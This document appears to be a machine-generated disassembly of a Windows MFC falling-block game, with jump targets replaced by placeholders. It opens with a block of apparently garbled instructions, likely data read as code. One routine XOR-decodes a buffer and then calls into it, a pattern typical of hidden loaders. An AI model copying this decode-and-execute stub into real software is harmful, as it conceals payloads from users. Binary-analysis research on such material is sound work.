mov eax 0x1420e5bf
enter 0x5ee0 0x4f
push 0x14616060
jecxz rwxdata
or ah [ eax - 0x13 ]
movsd [ edi ] [ esi ]
cwde
or ah [ eax + 0x8 ]
loopne rwxdata
out dx al
push edx
pushad
pushad
mov cl 0x9f
mov dh 0xb9
jecxz rwxdata
pushad
0x8cebb561 0x24e3
sub [ edx ] esp
pushad
cdq
pushad
pushad
lahf
test [ ebp + 0x60 ] 0x60
pushad
jecxz rwxdata
pushfd
popad
adc al 0x79
push es
daa
mov esp 0x61940860
pushad
or ah [ edx + 0x8 ]
pushad
pushad
pushad
mov al [ 0xffffffffb9b69fb7 ]
pushad
pushad
or ah [ ebx + 0xa ]
pushad
pushad
popad
adc eax 0x67270667
fisub [ eax - 0x75 ]
push es
daa
mov esp 0xe920d360
movsd [ edi ] [ esi ]
pushfd
mov bh 0xed
out dx al
int 0x61
pushad
pushad
mov cl 0xed
pop esi
push ecx
pusha
pushad
mov bh 0x9f
mul cl
pushad
pushad
pushad
mov bh 0xed
out 0x52 al
pushad
pushad
mov al 0x9f
imul [ 0x6b606060 ]
and [ 0x3a89bf66 ] dl
pushad
pushad
pushad
daa
movsd [ edi ] [ esi ]
xchg esp eax
pushad
pushad
pushad
pushad
mov bh 0xa
pushad
or al ah
pushad
lahf
adc al 0xf
test [ edx ] 0xf69fb760
cwde
insb
pushad
pushad
jmp 0xffffffffa04ac1c0
sub_403b20
sub esp 0x10
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
imul edi ebx
mov edx ebx
mov [ esp + 0x18 ] ecx
neg edx
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x10 ] 0x0
lea eax [ ecx + 0x4 ]
add edi edx
mov [ esp + 0x14 ] 0x4
jmp rwxdata
mov esi [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
imul esi ebx
lea ecx [ ecx + edx * 8 + 0x2c ]
mov ebp ebx
mov edx eax
mov eax [ esp + 0x28 ]
neg ebp
mov [ esp + 0x38 ] ecx
mov [ esp + 0x30 ] edx
add esi eax
mov [ esp + 0x2c ] 0x4
mov eax [ esp + 0x2c ]
add edx 0x2
add esi ebp
dec eax
mov [ esp + 0x30 ] edx
mov [ esp + 0x2c ] eax
jne rwxdata
mov eax [ esp + 0x24 ]
test eax eax
je rwxdata
cmp [ edx ] 0x1
jne rwxdata
mov ecx [ esp + 0x14 ]
mov eax edx
mov edx [ esp + 0x1c ]
add edi edx
dec ecx
mov [ esp + 0x14 ] ecx
jne rwxdata
mov eax [ esp + 0x10 ]
mov [ ecx - 0x4 ] esi
mov [ ecx ] edi
inc eax
add ecx 0x8
mov [ esp + 0x10 ] eax
mov [ esp + 0x38 ] ecx
mov eax [ eax + 0x4 ]
lea edx [ edi + ebx ]
lea ecx [ esi + ebx ]
push edx
push ecx
push edi
push esi
push eax
call [ Rectangle@IAT ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x20
sub_403c00
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403ca8 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0xe ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] ecx
sub_403cc0
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403d6c ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x14 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x4c ] ecx
sub_403d7c
nop
nop
nop
nop
push esi
mov esi ecx
call sub_403f90
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_403db0
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x1a ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_403e10
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0x10 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_403e70
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x6 ] ax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x14 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_403ed0
push esi
mov esi ecx
call sub_403f90
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403f74 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x4c ] ecx
sub_404050
push 0xffffffff
push sub_405fd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x138 ] 0x0
je rwxdata
xor eax eax
push rwxdata
push rwxdata
push rwxdata
push 0x80
mov ecx eax
call Ordinal_MFC42_520
jmp rwxdata
mov ecx [ esi + 0x20 ]
push 0x0
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
mov edx [ esi + 0x20 ]
push edx
call [ UpdateWindow@IAT ]
push 0x408
push rwxdata
lea eax [ esp + 0x34 ]
push rwxdata
push eax
call [ sprintf@IAT ]
add esp 0x10
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
mov ecx [ esp + 0x130 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
xor eax eax
pop esi
mov ecx [ esp + 0x12c ]
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
push eax
mov ecx esi
mov [ esp + 0x13c ] 0xffffffff
call Ordinal_MFC42_986
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_296
lea eax [ esp + 0x8 ]
mov ecx esi
push eax
mov [ esp + 0x13c ] 0x1
call Ordinal_MFC42_5214
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_5301
test eax eax
jne rwxdata
sub_404210
push 0xffffffff
push sub_405ff8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
lea ecx [ esp ]
call sub_4041a0
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_4042c0
push 0xffffffff
push sub_40601a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x54
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_404360
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4046e0
push 0xffffffff
push sub_40603a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x48
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_404840
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404780
push ebx
push esi
xor ebx ebx
push edi
xor eax eax
mov dl 0x1
mov [ ecx + rwxdata ] bl
lea esi [ eax + eax * 4 ]
lea edi [ ecx + eax ]
mov [ edi + esi * 2 + rwxdata ] dl
jmp rwxdata
cmp eax 0x18
je rwxdata
inc eax
cmp eax 0x19
jl rwxdata
inc ecx
cmp ecx 0xb
jl rwxdata
xor ecx ecx
pop edi
pop esi
pop ebx
retn
sub_4047c0
mov eax [ esp + 0x4 ]
cmp eax 0x6
ja rwxdata
xor eax eax
retn
jmp [ eax * 4 + jump_table_404820 ]
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
sub_404840
push esi
mov esi ecx
call Ordinal_MFC42_560
mov [ esi ] rwxdata
mov [ esi + 0x44 ] 0x0
call sub_404780
call [ rand@IAT ]
and eax 0x80000007
jns rwxdata
mov [ rwxdata ] eax
mov eax esi
pop esi
retn
dec eax
or eax 0xfffffff8
inc eax
sub_4048c0
push ecx
push ebx
push ebp
push esi
push edi
xor esi esi
mov dl 0x1
mov [ esp + 0x13 ] 0x0
mov edi 0x17
cmp esi 0x9
jne rwxdata
lea ecx [ edi + edi * 4 ]
xor ebp ebp
lea edx [ edi + ecx * 2 + rwxdata ]
mov [ esp + 0x13 ] 0x0
jmp rwxdata
inc esi
cmp esi 0xb
jl rwxdata
mov eax 0x1010101
mov ecx rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] ax
mov [ rwxdata ] al
mov [ esp + 0x13 ] 0x1
cmp ebp 0xa
jne rwxdata
dec edi
test edi edi
jg rwxdata
cmp [ esi + rwxdata ] dl
je rwxdata
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
cmp ecx rwxdata
jge rwxdata
mov al [ esp + 0x13 ]
test al al
je rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
inc ebp
cmp ebp 0xb
jl rwxdata
mov ecx edx
mov eax 0x1010101
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] ax
mov [ ecx + 0xa ] al
lea eax [ edi - 0x1 ]
test eax eax
jl rwxdata
xor eax eax
cmp [ edx + ebp ] 0x1
je rwxdata
jmp rwxdata
lea ecx [ eax + eax * 4 ]
lea esi [ eax + 0x1 ]
lea ecx [ eax + ecx * 2 + rwxdata ]
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
dec esi
jne rwxdata
xor eax eax
sub_4049a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4060b8
push eax
mov [ fs : 0x0 ] esp
mov al [ ecx + 0x44 ]
sub esp 0x44
test al al
push ebx
push ebp
push esi
push edi
mov bl 0x1
jne rwxdata
xor ebp ebp
mov [ esp + 0x24 ] rwxdata
mov [ esp + 0x28 ] ebp
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] ebp
call Ordinal_MFC42_323
push ebp
mov [ esp + 0x60 ] bl
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_1640
mov eax [ rwxdata ]
mov esi [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
sub eax esi
sub ecx edx
push eax
mov eax [ esp + 0x68 ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call [ CreateCompatibleBitmap@IAT ]
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_1641
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
neg eax
sbb eax eax
and eax ebx
push eax
push edx
call Ordinal_MFC42_5785
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov edi [ rwxdata ]
sub eax ecx
mov ecx [ rwxdata ]
push 0xffffff
sub ecx edi
push eax
push ecx
push ebp
push ebp
lea ecx [ esp + 0x58 ]
call Ordinal_MFC42_2753
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] rwxdata
mov edi rwxdata
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] edi
mov esi [ CreateSolidBrush@IAT ]
push 0x2b86f5
mov [ esp + 0x60 ] 0x3
call esi
push eax
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_1641
mov [ esp + 0x40 ] ebp
mov [ esp + 0x3c ] edi
push 0x2b0e91
mov [ esp + 0x60 ] 0x4
call esi
push eax
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_1641
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] edi
push 0x570e0f
mov [ esp + 0x60 ] 0x5
call esi
push eax
lea ecx [ esp + 0x38 ]
call Ordinal_MFC42_1641
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] edi
push 0x218ec7
mov [ esp + 0x60 ] 0x6
call esi
push eax
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_1641
push 0x212217
push 0x2
push ebp
call [ CreatePen@IAT ]
push eax
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1641
lea edx [ esp + 0x1c ]
lea ecx [ esp + 0x44 ]
push edx
call Ordinal_MFC42_5788
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push eax
call Ordinal_MFC42_5787
mov ecx [ rwxdata ]
push ecx
call sub_4047c0
mov edx [ rwxdata ]
mov ecx [ rwxdata ]
add esp 0x4
push edx
mov edx [ eax + 0x4c ]
push ecx
mov ecx [ eax + 0x48 ]
push 0x19
push edx
mov edx [ rwxdata ]
push ecx
mov ecx [ rwxdata ]
push edx
lea edx [ esp + 0x5c ]
push ecx
push edx
mov ecx eax
call sub_403b20
xor esi esi
mov eax [ ecx + 0x20 ]
push rwxdata
push eax
mov [ ecx + 0x44 ] bl
call [ GetClientRect@IAT ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add ecx 0x64
mov [ rwxdata ] edx
mov [ rwxdata ] ecx
mov edx [ esp + 0x10 ]
add edi 0x19
inc edx
cmp edi 0x113
mov [ esp + 0x10 ] edx
jl rwxdata
cmp esi 0x16
jne rwxdata
mov edx [ esp + 0x10 ]
cmp [ edx ] 0x0
jne rwxdata
inc esi
cmp esi 0x18
jl rwxdata
cmp esi 0x13
jl rwxdata
lea eax [ esp + 0x3c ]
push eax
jmp rwxdata
lea eax [ esi + esi * 4 ]
xor edi edi
lea ecx [ esi + eax * 2 + rwxdata ]
mov [ esp + 0x10 ] ecx
call sub_4048c0
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
mov ebx [ rwxdata ]
mov esi [ esp + 0x48 ]
sub ecx eax
lea eax [ esp + 0x44 ]
sub edx ebx
neg eax
sbb eax eax
push 0xcc0020
and eax esi
push ebp
push ebp
push eax
push ecx
mov ecx [ esp + 0x78 ]
push edx
push ebp
mov edx [ ecx + 0x4 ]
push ebp
push edx
call [ BitBlt@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_2405
mov esi rwxdata
mov [ esp + 0x2c ] esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] 0x7
call Ordinal_MFC42_2414
mov edi rwxdata
mov [ esp + 0x34 ] esi
mov [ esp + 0x2c ] edi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x5c ] 0x8
call Ordinal_MFC42_2414
mov [ esp + 0x34 ] edi
mov [ esp + 0x3c ] esi
lea ecx [ esp + 0x3c ]
mov [ esp + 0x5c ] 0x9
call Ordinal_MFC42_2414
mov [ esp + 0x3c ] edi
mov [ esp + 0x14 ] esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x5c ] 0xa
call Ordinal_MFC42_2414
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x5c ] 0xb
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x5c ] 0x0
call Ordinal_MFC42_640
mov [ esp + 0x24 ] esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5c ] 0xc
call Ordinal_MFC42_2414
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x4
cmp esi 0xf
jl rwxdata
cmp esi 0x15
jg rwxdata
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
mov edx [ rwxdata ]
mov ebp [ rwxdata ]
lea eax [ esi + esi * 4 + 0x5 ]
lea ebx [ edi + ebp + 0x19 ]
add ebp edi
lea ecx [ edx + eax * 4 ]
add eax ecx
lea ecx [ esi + esi * 4 ]
push eax
mov eax [ esp + 0x4c ]
lea edx [ edx + ecx * 4 ]
push ebx
add ecx edx
push ecx
push ebp
push eax
call [ Rectangle@IAT ]
xor ebp ebp
cmp esi 0x14
jg rwxdata
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
lea edx [ esp + 0x2c ]
push edx
sub_404d80
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] 0x1
lea esi [ edi + ebx - 0x1 ]
call [ rand@IAT ]
cdq
mov ecx 0x7
idiv ecx
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0xf
mov [ ebp + 0x8 ] eax
mov [ rwxdata ] edx
jl rwxdata
cmp al [ esi - 0x1 ]
je rwxdata
mov eax [ ebp - 0x4 ]
dec esi
mov [ eax + 0x44 ] 0x0
mov al [ esi ]
test al al
je rwxdata
jmp rwxdata
call sub_404780
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x1
lea eax [ ebx + ebx ]
push eax
push 0x0
call [ GlobalAlloc@IAT ]
mov esi eax
push 0x4
push 0xc
mov [ ebp - 0x8 ] esi
call sub_404d70
add esp 0x8
xor ecx ecx
test ebx ebx
mov [ ebp + 0xb ] al
jle rwxdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
mov dl [ ecx + 0x44 ]
mov [ ebp + 0xf ] dl
xor edx edx
test ebx ebx
jle rwxdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov al [ ecx + 0x44 ]
test al al
je rwxdata
mov cl [ esi ]
mov al [ ebp + 0xb ]
xor cl 0x9a
test al al
mov [ esi ] cl
je rwxdata
mov al [ ecx + edi ]
add edx 0x2
shr al 0x4
add al 0x1e
mov [ edx - 0x2 ] al
mov al [ ecx + edi ]
and al 0xf
add al 0x1e
inc ecx
mov [ edx - 0x1 ] al
cmp ecx ebx
jl rwxdata
mov esi [ ebp - 0x8 ]
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0xc ]
inc eax
mov ebx 0x24
add eax ebx
call eax
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi [ ebp - 0x8 ]
add cl 0x2
add esi 0x2
shl cl 0x4
mov [ edx + edi ] cl
mov al [ esi - 0x1 ]
sub al 0x1e
xor al cl
mov [ edx + edi ] al
inc edx
cmp edx ebx
jl rwxdata
sub_404ec0
mov eax [ rwxdata ]
push ebp
push esi
push edi
mov edi [ rwxdata ]
mov ebp ecx
add edi 0x19
push eax
mov [ rwxdata ] edi
call sub_4047c0
mov esi eax
add esp 0x4
mov ecx esi
mov ax [ esi + 0x24 ]
mov edx [ esi ]
push eax
push 0x0
push 0x0
push 0x0
call [ edx ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov eax [ esi + 0x4c ]
push ecx
mov ecx [ esi + 0x48 ]
push edx
mov edx [ rwxdata ]
push 0x19
push eax
mov eax [ rwxdata ]
push ecx
push edx
push eax
push 0x0
mov ecx esi
call sub_403b20
xor esi esi
xor esi esi
add esi 0x8
cmp esi 0x20
jl rwxdata
mov edx [ rwxdata ]
push edx
call sub_4047c0
mov ecx [ eax + esi + 0x28 ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_4047c0
mov ecx [ eax + esi + 0x2c ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esi 0x8
shr eax 0x1f
add edx eax
add esp 0x8
add edi edx
cmp esi 0x20
lea ecx [ edx + edx * 4 ]
mov [ edi + ecx * 2 + rwxdata ] 0x0
jl rwxdata
call [ rand@IAT ]
lea eax [ eax + eax * 2 ]
mov ecx 0x7
cdq
idiv ecx
push edx
mov [ rwxdata ] edx
call sub_4047c0
mov eax [ rwxdata ]
mov edi [ rwxdata ]
sub eax edi
add esp 0x4
cdq
sub eax edx
mov edx [ rwxdata ]
sar eax 0x1
sub eax 0xc
pop edi
pop esi
mov [ rwxdata ] eax
mov [ rwxdata ] edx
pop ebp
retn 0x4
mov ecx [ rwxdata ]
push ecx
call sub_4047c0
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_4047c0
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esp 0x8
shr eax 0x1f
add edx eax
add edi edx
lea ecx [ edx + edx * 4 ]
mov al [ edi + ecx * 2 + rwxdata ]
test al al
je rwxdata
mov eax [ rwxdata ]
cmp eax 0xa
jle rwxdata
inc eax
mov [ rwxdata ] eax
cmp eax 0x64
jge rwxdata
push 0x0
mov ecx ebp
call sub_4052e0
mov [ rwxdata ] 0xc8
jmp rwxdata
mov eax [ ebp + 0x20 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx ebp
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebp
retn 0x4
sub_4050a0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call Ordinal_MFC42_4464
cmp eax 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x0
mov ecx [ esi + 0x20 ]
push 0x0
push 0x96
push 0x1
push ecx
call [ SetTimer@IAT ]
lea edx [ esp + 0x8 ]
push edx
call [ time@IAT ]
lea eax [ esp + 0xc ]
push eax
call [ gmtime@IAT ]
mov ecx [ eax ]
push ecx
call [ srand@IAT ]
add esp 0xc
xor eax eax
pop esi
retn 0x4
or eax eax
pop esi
retn 0x4
sub_405100
mov eax [ rwxdata ]
push ebx
push esi
push edi
mov ebx ecx
push eax
call sub_4047c0
mov edx [ esp + 0x14 ]
mov ecx eax
add esp 0x4
lea eax [ edx - 0x25 ]
cmp eax 0x3
ja rwxdata
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
jmp [ eax * 4 + jump_table_4052bc ]
mov ax [ ecx + 0x24 ]
inc ax
movsx eax ax
cdq
idiv [ ecx + 0x50 ]
mov [ ecx + 0x24 ] dx
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
xor esi esi
xor edi edi
add eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
sub eax 0x19
add esi 0x8
cmp esi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add edi edx
mov cl [ edi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
add edi 0x8
cmp edi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add esi edx
mov cl [ esi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
mov ecx [ rwxdata ]
push ecx
call sub_4047c0
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_4047c0
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ edi - 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
test ecx ecx
jl rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jge rwxdata
add [ rwxdata ] 0x19
mov ecx [ rwxdata ]
push ecx
call sub_4047c0
mov ecx [ eax + edi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
